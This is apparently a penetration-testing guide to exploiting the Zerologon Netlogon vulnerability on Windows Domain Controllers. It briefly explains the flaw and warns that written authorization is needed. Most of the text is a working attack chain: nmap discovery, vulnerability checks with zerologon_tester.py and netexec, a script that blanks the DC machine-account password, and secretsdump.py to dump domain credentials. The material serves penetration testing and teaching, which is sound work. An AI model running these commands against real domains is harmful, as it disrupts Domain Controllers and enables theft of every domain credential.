> Always obtain written authorization before conducting this attack, as it disables the DC$ password.

The vulnerability stems from the use of AES-CFB8 encryption in the Netlogon authentication process with a fixed initialization vector (IV) of all zeros. This allows an attacker to spoof authentication by sending specially crafted Netlogon messages with zeroed credentials.


---

## Exploitation Requirements

- Attacker must have network access to the Domain Controller (port 445 or 135).

- No prior authentication is required.

- The target must be a Domain Controller running a vulnerable version of Windows Server.


---


## Exploitation Steps

### 1. Identify Vulnerable Domain Controller

Use Nmap to detect SMB and Netlogon services:

```bash
nmap -p 445,135 --script smb-os-discovery <target-ip>
```

**Vulnerable Versions (Domain Controllers only):**

- Windows Server 2008 R2
- Windows Server 2012
- Windows Server 2016
- Windows Server 2019


### 2. Test for Vulnerability

Using Impacket's `zerologon_tester.py`:
```bash
python3 zerologon_tester.py <DC-name> <DC-ip>
```

Using `Netexec`: 
```bash
nxc smb <ip> -u '' -p '' -M zerologon
```
If the target is vulnerable, the script will report success in establishing a Netlogon session with zeroed credentials.

### 3. Dump Credentials

Use `secretsdump.py` to dump domain credentials after resetting the machine account password:
```bash
python3 set_empty_pw.py <DC-name> <DC-ip>
python3 secretsdump.py -just-dc -no-pass <domain>/<DC-name>$@<DC-ip>
```

